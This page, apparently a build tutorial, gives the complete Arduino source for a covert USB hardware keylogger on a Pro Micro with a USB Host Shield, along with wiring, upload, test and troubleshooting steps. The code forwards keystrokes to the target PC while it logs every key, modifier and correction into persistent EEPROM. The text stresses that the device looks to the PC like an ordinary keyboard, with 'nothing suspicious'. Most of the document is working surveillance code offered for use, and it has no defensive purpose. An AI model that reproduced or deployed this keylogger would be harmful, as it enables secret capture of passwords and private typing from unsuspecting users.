FULL CODE

i
This code logs ALL keystrokes including backspace corrections, special characters (%, @, ! etc.), modifier keys (Ctrl, Alt), and function keys. Stores in EEPROM — survives power off.
pro_micro_keylogger.ino Arduino C++ 
// ================================================================
// USB Keylogger — Pro Micro ATmega32U4 + USB Host Shield
// Board:   SparkFun Pro Micro 5V 16MHz
// Library: USB Host Shield Library 2.0
//
// WIRING:
//   Pro Micro VCC  → Host Shield VCC
//   Pro Micro GND  → Host Shield GND
//   Pro Micro 10   → Host Shield SS
//   Pro Micro 16   → Host Shield MOSI
//   Pro Micro 14   → Host Shield MISO
//   Pro Micro 15   → Host Shield SCK
//   Logitech receiver → Host Shield female USB port
//   Pro Micro Micro-USB → Target PC
//
// SERIAL MONITOR COMMANDS (115200 baud):
//   ? = print stored log
//   ! = clear EEPROM log
// ================================================================

#include <hidboot.h>
#include <usbhub.h>
#include <EEPROM.h>

USB Usb;
HIDBoot<USB_HID_PROTOCOL_KEYBOARD> HidKeyboard(&Usb);

// EEPROM layout
#define EEPROM_COUNT_ADDR 0
#define EEPROM_DATA_START 1
#define EEPROM_MAX_CHARS  253

// ── EEPROM functions ──────────────────────────────────────────
void saveToEEPROM(String entry) {
  uint8_t count = EEPROM.read(EEPROM_COUNT_ADDR);
  if (count > EEPROM_MAX_CHARS) count = 0;
  for (int i = 0; i < entry.length(); i++) {
    if (count < EEPROM_MAX_CHARS) {
      EEPROM.write(EEPROM_DATA_START + count, entry[i]);
      count++;
    }
  }
  EEPROM.write(EEPROM_COUNT_ADDR, count);
}

void printEEPROMLog() {
  uint8_t count = EEPROM.read(EEPROM_COUNT_ADDR);
  if (count == 0 || count > EEPROM_MAX_CHARS) {
    Serial.println("(EEPROM empty)");
    return;
  }
  Serial.println("======= STORED LOG =======");
  for (int i = 0; i < count; i++) {
    Serial.print((char)EEPROM.read(EEPROM_DATA_START + i));
  }
  Serial.println("\n======= END =======");
}

void clearEEPROM() {
  EEPROM.write(EEPROM_COUNT_ADDR, 0);
  Serial.println("Log cleared.");
}

void logKey(String entry) {
  Serial.print(entry);
  saveToEEPROM(entry);
}

// ── Keyboard Parser ───────────────────────────────────────────
class KbdRptParser : public KeyboardReportParser {
protected:
  void OnKeyDown(uint8_t mod, uint8_t key);
};

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) {
  uint8_t c = OemToAscii(mod, key);

  // Forward to PC transparently
  if (c) { Keyboard.press(c); delay(5); Keyboard.release(c); }

  // Modifier prefix (Ctrl/Alt only — Shift handled by OemToAscii)
  bool ctrl = (mod & 0x01) || (mod & 0x10);
  bool alt  = (mod & 0x04) || (mod & 0x40);
  if (ctrl) logKey("[CTRL+");
  if (alt)  logKey("[ALT+");

  // Log the actual key
  if      (c >= 32 && c < 127) { logKey(String((char)c));   }
  else if (c == 13)             { logKey("[ENTER]\n");       }
  else if (c == 8)              { logKey("[BKSP]");          }
  else if (c == 9)              { logKey("[TAB]");           }
  else if (c == 27)             { logKey("[ESC]");           }
  else if (c == 32)             { logKey(" ");              }
  else if (key == 0x4F)         { logKey("[RIGHT]");        }
  else if (key == 0x50)         { logKey("[LEFT]");         }
  else if (key == 0x51)         { logKey("[DOWN]");         }
  else if (key == 0x52)         { logKey("[UP]");           }
  else if (key == 0x4C)         { logKey("[DEL]");          }
  else if (key == 0x4A)         { logKey("[HOME]");         }
  else if (key == 0x4D)         { logKey("[END]");          }
  else if (key >= 0x3A && key <= 0x45) {
    logKey("[F" + String(key - 0x39) + "]");
  }

  // Close modifier bracket
  if (ctrl || alt) logKey("]");
}

KbdRptParser Prs;

// ── Setup ─────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  Keyboard.begin();

  Serial.println("======= USB Keylogger =======");
  Serial.println("? = print log | ! = clear");
  Serial.println("--- Previous session ---");
  printEEPROMLog();
  Serial.println("--- Live now ---");

  if (Usb.Init() == -1) {
    Serial.println("ERROR: Host Shield FAILED");
    Serial.println("Check: VCC GND SS=10 MOSI=16 MISO=14 SCK=15");
    while (1) {
      digitalWrite(LED_BUILTIN, HIGH); delay(300);
      digitalWrite(LED_BUILTIN, LOW);  delay(300);
    }
  }
  HidKeyboard.SetReportParser(0, &Prs);
  Serial.println("Ready — start typing on the keyboard");
}

// ── Loop ──────────────────────────────────────────────────────
void loop() {
  Usb.Task();
  if (Serial.available()) {
    char cmd = Serial.read();
    if (cmd == '?') printEEPROMLog();
    if (cmd == '!') clearEEPROM();
  }
}

HOW TO UPLOAD

1

Plug Pro Micro into Kali via Micro-USB

Nothing else connected yet — just Pro Micro to your laptop.

2

Find the port

ls /dev/ttyACM*
# Should show: /dev/ttyACM0
3

Set board settings in Arduino IDE

  • Tools > Board > SparkFun Pro Micro 5V 16MHz
  • Tools > Processor > ATmega32U4 (5V, 16MHz)
  • Tools > Port > /dev/ttyACM0
4

Paste the code and click Upload

If upload fails: quickly double-tap the reset button on the Pro Micro, then immediately click Upload again. You have about 8 seconds.

5

Open Serial Monitor

  • Tools > Serial Monitor
  • Set baud rate to 115200
  • You should see: USB Keylogger Ready

HOW TO TEST

1

Wire Pro Micro → Host Shield

6 jumper wires as per the wiring table above.

2

Plug Logitech receiver into Host Shield

Push the nano receiver into the female USB port on the Host Shield board.

3

Plug Pro Micro into PC via Micro-USB

PC detects it as a normal keyboard — nothing suspicious.

4

Open Serial Monitor and start typing

Every keystroke appears live in the Serial Monitor.

Example — Backspace correction visible in log

User types: abam → [BKSP][BKSP] → dam → adam
Log shows: a b a m [BKSP][BKSP] d a m [ENTER]
Special: Shift+5 = %  |  Shift+2 = @  |  Ctrl+C = [CTRL+c]

TROUBLESHOOTING

ProblemCauseFix
LED blinks fast, Serial says "Host Shield FAILED" SPI wiring wrong Check all 6 pins: VCC GND SS=10 MOSI=16 MISO=14 SCK=15
Upload fails on Kali Port permission or bootloader timing Double-tap reset then immediately click Upload. Or: sudo chmod a+rw /dev/ttyACM0
No /dev/ttyACM0 appears Not in dialout group sudo usermod -a -G dialout $USER then logout and login
Keyboard not detected Logitech receiver not seated properly Push receiver fully into Host Shield USB port — it should be snug
Keystrokes not appearing in Serial Monitor Wrong baud rate Set Serial Monitor to exactly 115200 baud
PC doesn't detect keyboard Pro Micro not recognised as HID Make sure board is set to SparkFun Pro Micro 5V 16MHz NOT Uno
Special chars (% @ !) not showing correctly OemToAscii mapping This is automatic — if wrong, check your keyboard layout matches
